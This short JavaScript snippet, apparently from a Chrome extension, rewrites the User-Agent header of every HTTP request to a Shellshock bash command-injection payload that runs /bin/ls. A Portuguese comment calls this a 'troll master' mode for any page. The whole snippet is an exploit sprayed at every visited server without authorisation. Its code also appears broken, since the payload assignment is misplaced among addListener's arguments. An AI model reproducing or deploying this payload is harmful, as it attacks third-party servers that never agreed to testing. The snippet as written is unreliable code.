chrome.webRequest.onBeforeSendHeaders.addListener(

    sUserAgenteString = "() { test;};echo 'Content-type: text/plain'; echo; echo; /bin/ls";

    function(sReq) {
      // Varrendo header para lozalizar variavel User-Agent
      // no header
      var aHeaders = sReq.requestHeaders;
      //console.log(aHeaders);
      aHeaders.forEach(function(header, i) {
        if (header.name == 'User-Agent') {
          header.value = sUserAgenteString;
        }
      });
      return {requestHeaders: aHeaders};
    },
    {
        // Modo troll master ativo qualquer página  ;)
    urls: [
            "http://*/*"
        ]
    },
    [
      "blocking",
      "requestHeaders"
    ]
);
